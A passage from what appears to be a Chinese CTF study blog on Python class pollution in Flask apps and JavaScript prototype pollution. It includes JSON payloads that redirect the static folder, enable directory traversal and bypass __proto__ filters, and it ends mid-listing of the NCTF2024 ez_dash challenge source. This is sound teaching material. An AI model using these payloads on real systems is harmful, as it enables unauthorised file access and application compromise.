<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;app&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;_got_first_request&quot;</span><span class="punctuation">:</span>False</span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>init</code>函数被触发，且其中读取<code>flag</code>的相关逻辑被执行，这样就获得了<code>flag</code></p>
<h6 id="static-url-path"><a href="#static-url-path" class="headerlink" title="_static_url_path:"></a>_static_url_path:</h6><p>当python指定了static静态目录以后，我们再进行访问就会定向到static文件夹下面的对应文件而不会存在目录穿梭的漏洞，但是如果我们想要访问其他文件下面的敏感信息，我们就需要污染这个静态目录，让他自动帮我们实现定向</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#static/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Tech Otakus Save The World<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>    </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>app.py：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but heres only static/index.html&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;</span><br><span class="line">    &quot;__init__&quot;:&#123;</span><br><span class="line">        &quot;__globals__&quot;:&#123;</span><br><span class="line">            &quot;app&quot;:&#123;</span><br><span class="line">                &quot;_static_folder&quot;:&quot;./&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h6 id="os-path-pardir"><a href="#os-path-pardir" class="headerlink" title="os.path.pardir:"></a>os.path.pardir:</h6><p><code>os.path.pardir</code> 是 Python 中 <code>os.path</code> 模块的一个常量，它代表当前目录的父目录（即上一级目录）。在文件系统中，<code>os.path.pardir</code> 通常对应于字符串 <code>..</code></p>
<p>环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#templates/index.html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;h1&gt;Tech Otakus Save The World&lt;/h1&gt;</span><br><span class="line">&lt;body&gt;    </span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>app.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#app.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        merge(json.loads(request.data), instance)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;flag in ./flag but u just can use /file to vist ./templates/file&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_page</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里的话你进行一个目录穿梭比如：</p>
<p><code>../1.py</code>这样子的会报错，因为python里的<code>split_template_path</code>如果发现..就会报错或者直接不允许穿越，而我们的<code>os.path.pardir</code>恰好是我们的..所以会进行报错，所以我们如果把这个地方进行修改为除..外的任意值，我们就可以进行目录穿梭了</p>
<p>payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;os&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;pardir&quot;</span><span class="punctuation">:</span><span class="string">&quot;,&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>



<h4 id="JavaScript原型链污染"><a href="#JavaScript原型链污染" class="headerlink" title="JavaScript原型链污染"></a>JavaScript原型链污染</h4><p><a target="_blank" rel="noopener" href="https://zixyd.github.io/2024/01/31/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型污染 · zIxyd’s Blog</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/275619.html">JavaScript原型链污染原理及相关CVE漏洞剖析 - FreeBuf网络安全行业门户</a></p>
<p>JavaScript 中的每个对象都链接到某种类型的另一个对象，称为原型。JavaScript 使用原型继承模型，这与许多其他语言使用的基于类的模型有很大不同。默认情况下，JavaScript 会自动将新对象分配给其内置原型之一。例如，字符串会自动分配内置的<code>String.prototype</code>. 您可以在下面看到这些全局原型的更多示例：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myObject = &#123;&#125;;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(myObject);    <span class="comment">// Object.prototype</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myString = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(myString);    <span class="comment">// String.prototype</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myArray = [];</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(myArray);	    <span class="comment">// Array.prototype</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> myNumber = <span class="number">1</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(myNumber);    <span class="comment">// Number.prototype</span></span><br></pre></td></tr></table></figure>

<p>对象会自动继承其指定原型的所有属性，除非它们已经拥有具有相同键的自己的属性。这使得开发人员能够创建可以重用现有对象的属性和方法的新对象</p>
<p>内置原型提供了用于处理基本数据类型的有用属性和方法。例如，<code>String.prototype</code>对象有一个<code>toLowerCase()</code>方法。因此，所有字符串都会自动有一个现成的方法将它们转换为小写。这使得开发人员不必手动将此行为添加到他们创建的每个新字符串中</p>
<p><strong>对象继承是如何工作的？</strong></p>
<p>每当您引用对象的属性时，JavaScript 引擎都会首先尝试直接在对象本身上访问该属性。如果对象没有匹配的属性，JavaScript 引擎会在对象的原型上查找它</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w14.png"></p>
<p>由于实际上 JavaScript 中的所有内容都是底层的对象，因此这条链最终会回到顶层<code>Object.prototype</code>，其原型很简单<code>null</code></p>
<h5 id="利用-proto-访问"><a href="#利用-proto-访问" class="headerlink" title="利用__proto__访问"></a>利用<code>__proto__</code>访问</h5><p>你可以这样访问：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username.<span class="property">__proto__</span></span><br><span class="line">username[<span class="string">&#x27;__proto__&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>甚至可以链接引用以<code>__proto__</code>沿着原型链向上工作：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username.<span class="property">__proto__</span>                        <span class="comment">// String.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>              <span class="comment">// Object.prototype</span></span><br><span class="line">username.<span class="property">__proto__</span>.<span class="property">__proto__</span>.<span class="property">__proto__</span>    <span class="comment">// null</span></span><br></pre></td></tr></table></figure>

<p>E.g</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Teacher</span>(<span class="params">name,age,gender,subject</span>)&#123;</span><br><span class="line">	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,name);</span><br><span class="line">	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,age);</span><br><span class="line">	<span class="title class_">Person</span>.<span class="title function_">call</span>(<span class="variable language_">this</span>,gender);</span><br><span class="line">	<span class="variable language_">this</span>.<span class="property">subject</span>=subject;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span>=<span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Teacher</span>.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>

<p>这里的Person就是外部定义的一个类</p>
<p>创建一个构造函数<code>Teacher</code>，其中调用<code>Person.call</code>运行<code>Person</code>构造函数对<code>Teacher</code>中的<code>this.name</code>赋值，<code>new Person()</code> 会创建一个新的对象，并且这个对象的内部原型是 <code>Person.prototype</code>。将这个新对象赋值给 <code>Teacher.prototype</code> 后，<code>Teacher</code> 构造函数的原型对象就拥有了 <code>Person</code> 的原型属性和方法：</p>
<p><img src="/img/lazy.gif" data-original="/2025/05/31/Web%E5%9F%BA%E7%A1%80-1/w15.png"></p>
<h5 id="原型链污染-1"><a href="#原型链污染-1" class="headerlink" title="原型链污染"></a>原型链污染</h5><p>当JavaScript函数递归地将包含用户可控属性的对象合并到现有对象时，通常会出现原型污染漏洞。这可以允许攻击者注入带有类似<code>__proto__</code>的键的属性，以及任意嵌套的属性</p>
<p>由于<code>__proto__</code>在JavaScript上下文中的特殊含义，合并操作可能会将嵌套属性分配给对象的原型，而不是目标对象本身。因此，攻击者可以用包含恶意值的属性污染原型，这些属性随后可能被应用程序以危险的方式使用</p>
<p><code>__proto__</code> 是 JavaScript 中一个对象属性，用于访问该对象的原型对象</p>
<p><code>__proto__</code> 可以用于手动改变对象的原型，例如，当你想让一个已有的对象继承另一个对象的属性和方法时，可以使用它来改变原型</p>
<p><strong>1. <code>prototype</code> 属性</strong></p>
<ul>
<li><strong>定义</strong>：每个函数都有一个 <code>prototype</code> 属性，它是一个对象。当你通过构造函数创建一个新对象时，这个新对象会继承构造函数的 <code>prototype</code> 对象</li>
<li><strong>用途</strong>：<ul>
<li>用于定义构造函数的原型对象，该原型对象包含所有实例共享的属性和方法</li>
<li>实现继承：通过将一个构造函数的 <code>prototype</code> 设置为另一个构造函数的实例，可以实现继承</li>
</ul>
</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义构造函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="comment">// 实例属性</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 在构造函数的 prototype 上定义共享方法</span></span><br><span class="line">  <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayHello</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Hello, my name is <span class="subst">$&#123;<span class="variable language_">this</span>.name&#125;</span> and I am <span class="subst">$&#123;<span class="variable language_">this</span>.age&#125;</span> years old.`</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 创建实例</span></span><br><span class="line">  <span class="keyword">const</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>, <span class="number">25</span>);</span><br><span class="line">  <span class="keyword">const</span> person2 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Bob&quot;</span>, <span class="number">30</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 调用共享方法</span></span><br><span class="line">  person1.<span class="title function_">sayHello</span>(); <span class="comment">// 输出: Hello, my name is Alice and I am 25 years old.</span></span><br><span class="line">  person2.<span class="title function_">sayHello</span>(); <span class="comment">// 输出: Hello, my name is Bob and I am 30 years old.</span></span><br></pre></td></tr></table></figure>

<p><strong>2. <code>__proto__</code> 属性</strong></p>
<ul>
<li><strong>定义</strong>：每个对象都有一个 <code>__proto__</code> 属性，它指向创建该对象的构造函数的 <code>prototype</code> 对象。<code>__proto__</code> 是对象的内部原型引用</li>
<li><strong>用途</strong>：<ul>
<li>用于访问对象的原型对象</li>
<li>在原型链查找中，JavaScript 引擎会通过 <code>__proto__</code> 属性向上查找属性和方法</li>
</ul>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Person</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">sayName</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> person1 = <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;Alice&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person1.<span class="property">__proto__</span> === <span class="title class_">Person</span>.<span class="property"><span class="keyword">prototype</span></span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h5 id="Json输入造成污染"><a href="#Json输入造成污染" class="headerlink" title="Json输入造成污染"></a>Json输入造成污染</h5><p>用户可控的对象通常是使用该<code>JSON.parse()</code>方法从 JSON 字符串派生的。有趣的是，<code>JSON.parse()</code>还将 JSON 对象中的任何键视为任意字符串，包括<code>__proto__</code>. 这为原型污染提供了另一个潜在载体。</p>
<p>假设攻击者通过网络消息注入以下恶意 JSON：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;evilProperty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;payload&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果通过该方法将其转换为 JavaScript 对象<code>JSON.parse()</code>，则生成的对象实际上将具有一个带有 key 的属性<code>__proto__</code>：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> objectLiteral = &#123;<span class="attr">__proto__</span>: &#123;<span class="attr">evilProperty</span>: <span class="string">&#x27;payload&#x27;</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">const</span> objectFromJson = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;evilProperty&quot;: &quot;payload&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objectLiteral.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>));     <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(objectFromJson.<span class="title function_">hasOwnProperty</span>(<span class="string">&#x27;__proto__&#x27;</span>));    <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p> <code>hasOwnProperty</code>函数是JavaScript中的一个内置函数，用于检查对象自身是否包含指定的属性（即不包括从原型链继承的属性）</p>
<h5 id="绕过过滤了-proto-的污染"><a href="#绕过过滤了-proto-的污染" class="headerlink" title="绕过过滤了__proto__的污染"></a>绕过过滤了<code>__proto__</code>的污染</h5><p>假如一开始payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;__proto__&quot;:&#123;</span><br><span class="line">    &quot;json spaces&quot;:10</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有反应</p>
<p>可以用<code>constructor.prototype === __proto__</code>绕过</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;json spaces&quot;</span><span class="punctuation">:</span><span class="number">10</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h5 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h5><p>其实Javascript也不是所有都要用到<code>__proto__</code>的，这点在下面的例题中有所体现</p>
<h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><h4 id="NCTF2024-ez-dash"><a href="#NCTF2024-ez-dash" class="headerlink" title="NCTF2024 ez_dash"></a>NCTF2024 ez_dash</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span 